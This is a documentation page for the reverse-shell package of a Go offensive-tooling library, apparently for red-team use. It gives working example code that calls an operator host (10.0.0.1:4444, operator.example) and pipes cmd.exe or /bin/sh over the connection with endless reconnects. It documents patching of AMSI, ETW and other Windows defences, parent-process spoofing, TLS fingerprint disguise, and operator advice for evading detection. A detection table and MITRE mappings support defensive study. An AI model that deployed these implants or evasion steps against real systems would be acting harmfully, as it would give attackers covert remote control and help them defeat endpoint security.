---
package: github.com/oioio-space/maldev/c2/shell
last_reviewed: 2026-04-27
reflects_commit: 36484a4
---

# Reverse shell

[← c2 index](README.md) · [docs/index](../../index.md)

## TL;DR

Implant calls home over any [`c2/transport`](transport.md) and pipes
a local interpreter (`cmd.exe` or `/bin/sh`) over the connection. The
loop reconnects on drop with configurable retry count and back-off
delay. Unix path allocates a PTY for full interactive use; Windows
path uses direct `cmd.exe` I/O and optionally patches AMSI / ETW /
CLM / WLDP + disables PowerShell history before the shell starts.

## Primer

Network firewalls typically allow outbound connections and block
inbound ones, so a "reverse" shell calls **out** from the target to
the operator. The operator runs a listener; the implant runs a
short program that opens an outbound socket, fork-execs a local
interpreter, and wires the interpreter's stdio to the socket.

Two common failure modes need explicit handling. Connections drop —
the package wraps the connect / pipe loop in an automatic reconnect
loop with configurable retry count and delay. Interpreter behaviour
on Windows differs from Unix — Unix needs a PTY for `vim` / `top` /
job control to work; Windows needs no PTY but does need careful
stdio handling. The package abstracts both differences behind a
single `Shell` type.

The Windows code path also exposes optional defence-patching: AMSI
disable (so PowerShell stages survive scanning), ETW patching (so
provider-based EDRs go quiet), CLM bypass (Constrained Language Mode
restrictions disabled), WLDP patching (Windows Lockdown Policy
relaxed), and PowerShell history disable (so `Get-History`
post-mortem returns nothing).

## How it works

```mermaid
stateDiagram-v2
    [*] --> Idle
    Idle --> Connecting : Start(ctx)
    Connecting --> Running : Connect OK
    Connecting --> Backoff : Connect fail
    Backoff --> Connecting : delay elapsed
    Running --> Backoff : transport drop
    Running --> Stopping : Stop()
    Backoff --> Stopping : Stop()
    Stopping --> [*] : Wait()
```

The `Shell` runs a strict state machine — `Start` is rejected on a
running shell; `Stop` is rejected on an idle one. Transitions are
mutex-guarded.

```mermaid
sequenceDiagram
    participant Op as Operator listener
    participant Imp as Implant
    participant Sh as Local interpreter

    loop until Stop or max retries
        Imp->>Op: transport.Connect()
        alt success
            Imp->>Sh: spawn cmd.exe / /bin/sh (PTY on Unix)
            Sh-->>Imp: stdio
            par implant→operator
                Imp->>Op: copy(stdin → socket)
            and operator→implant
                Op->>Imp: copy(socket → stdout)
            end
            Note over Imp: socket dropped<br/>or Stop()
            Imp->>Sh: kill child
        else fail
            Imp->>Imp: backoff(delay)
        end
    end
```

## API Reference

### `shell.New(trans transport.Transport, cfg *Config) *Shell`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#New)

Construct a `Shell` over the supplied transport. `cfg == nil`
selects `DefaultConfig()`.

### `shell.DefaultConfig() *Config`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#DefaultConfig)

Defaults: 5 reconnect attempts, 3 s back-off, no defence patching,
PTY enabled on Unix.

### `(*Shell).Start(ctx context.Context) error`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#Shell.Start)

Run the connect / pipe / reconnect loop. Returns when `ctx` is
cancelled, `Stop` is called, or `MaxRetries` is exceeded.

### `(*Shell).Stop() error`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#Shell.Stop)

Request graceful shutdown. Pair with `Wait` to block until the
loop exits.

### `(*Shell).Wait()`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#Shell.Wait)

Block until `Start` returns.

### `(*Shell).IsRunning() bool` / `(*Shell).CurrentPhase() Phase`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#Shell.CurrentPhase)

State inspection helpers.

### `shell.PatchDefenses() error` (Windows)

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#PatchDefenses)

Apply the AMSI / ETW / CLM / WLDP / PS history patches in one call.
Idempotent. Use **before** `Start` so the spawned `cmd.exe` /
`powershell.exe` inherits the patched ntdll.

### `shell.NewPPIDSpoofer()` / `(*PPIDSpoofer).SysProcAttr()` (Windows)

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/c2/shell#PPIDSpoofer)

Build a `*syscall.SysProcAttr` whose `ParentProcess` field points at
a chosen target (default: `explorer.exe`, `services.exe`,
`RuntimeBroker.exe`). Apply on the `exec.Cmd` the shell spawns to
make process-tree telemetry show the spoofed parent.

## Examples

### Simple

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/c2/transport"
)

tr := transport.NewTCP("10.0.0.1:4444", 10*time.Second)
sh := shell.New(tr, nil)
_ = sh.Start(context.Background())
sh.Wait()
```

### Composed (TLS + cert pin)

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/c2/transport"
)

const operatorPin = "AB:CD:..." // SHA-256

tr := transport.NewTLS("operator.example:8443", 10*time.Second, "", "",
    transport.WithTLSPin(operatorPin))
sh := shell.New(tr, nil)
_ = sh.Start(context.Background())
sh.Wait()
```

### Advanced (defence patching + PPID spoof + uTLS)

```go
import (
    "context"
    "os/exec"
    "time"

    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/c2/transport"
)

_ = shell.PatchDefenses()

spoof := shell.NewPPIDSpoofer()
if err := spoof.FindTargetProcess(); err == nil {
    // The spoofer publishes a SysProcAttr the shell layer applies
    // to the spawned cmd.exe.
    _ = spoof
}

tr := transport.NewUTLS("operator.example:443", 10*time.Second,
    transport.WithJA3Profile(transport.HelloChromeAuto),
    transport.WithSNI("cdn.jsdelivr.net"),
    transport.WithUTLSFingerprint("AB:CD:..."))

cfg := shell.DefaultConfig()
cfg.MaxRetries = 100
cfg.RetryDelay = 30 * time.Second

sh := shell.New(tr, cfg)
_ = sh.Start(context.Background())
sh.Wait()
_ = exec.Command // silence unused import in extracted snippet
```

### Complex (full chain — evade + spoof + uTLS + reconnect forever)

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/c2/transport"
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/preset"
)

_ = evasion.ApplyAll(preset.Stealth(), nil) // AMSI/ETW/CLM/WLDP/...
_ = shell.PatchDefenses()                   // belt + braces

tr := transport.NewUTLS("operator.example:443", 10*time.Second,
    transport.WithJA3Profile(transport.HelloChromeAuto),
    transport.WithSNI("cdn.jsdelivr.net"),
    transport.WithUTLSFingerprint("AB:CD:..."))

cfg := shell.DefaultConfig()
cfg.MaxRetries = 0 // 0 = unlimited
cfg.RetryDelay = 60 * time.Second

sh := shell.New(tr, cfg)
ctx, cancel := context.WithCancel(context.Background())
defer cancel()
_ = sh.Start(ctx)
sh.Wait()
```

See `ExampleNew` in
[`shell_example_test.go`](../../../c2/shell/shell_example_test.go).

## OPSEC & Detection

| Artefact | Where defenders look |
|---|---|
| Outbound TCP from a non-network process | Sysmon Event 3, EDR egress hooks |
| `cmd.exe` / `powershell.exe` child of an unusual parent | Sysmon Event 1 — pair with `PPIDSpoofer` to reshape |
| AMSI / ETW patch bytes in ntdll/amsi.dll | Memory scanners (Defender, MDE Live Response) |
| Beacon timing patterns | Behavioural NIDS — randomise `RetryDelay` jitter |
| Long-lived `cmd.exe` with redirected stdio | Process-explorer anomaly |

**D3FEND counters:**

- [D3-OCA](https://d3fend.mitre.org/technique/d3f:OutboundConnectionAnalysis/)
  — outbound-connection profiling.
- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/)
  — `cmd.exe` parentage and command-line analysis.
- [D3-NTA](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis/)
  — TLS handshake + content metadata.

**Hardening for the operator:** prefer uTLS over plain TLS; pair
`PatchDefenses` and PPID spoofing; randomise `RetryDelay` with
[`random.Duration`](../../../random); fold the shell into a longer-lived
host process that legitimately spawns command interpreters
(maintenance scripts, build agents).

## MITRE ATT&CK

| T-ID | Name | Sub-coverage | D3FEND counter |
|---|---|---|---|
| [T1059](https://attack.mitre.org/techniques/T1059/) | Command and Scripting Interpreter | reverse-shell harness | D3-PSA |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | PowerShell | when child is `powershell.exe` | D3-PSA |
| [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | when child is `cmd.exe` | D3-PSA |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Unix Shell | Unix code path | D3-PSA |

## Limitations

- **Reverse shells are inherently noisy.** No amount of jitter
  defeats a determined defender with full network visibility. Use
  uTLS + malleable profiles and accept that the shell is a
  short-lifetime tool.
- **`PatchDefenses` is best-effort.** AMSI/ETW patches survive within
  the current process only. Spawned children inherit patched ntdll;
  re-spawned shells from a different host process do not.
- **PTY only on Unix.** Windows lacks a true PTY — interactive
  applications (`vim`, full-screen TUIs) misbehave.
- **PPID spoof requires admin or specific process ACLs.** Some
  targets refuse cross-session parent pinning even from elevated
  processes.

## See also

- [Transport](transport.md) — bytes-on-wire layer.
- [Multicat](multicat.md) — operator listener.
- [Malleable profiles](malleable-profiles.md) — HTTP-shaped variant.
- [`evasion/preset`](../evasion/README.md) — apply before `Start`.
- [`process/spoofparent`](../evasion/ppid-spoofing.md) — alternative
  PPID spoofing implementation outside the shell package.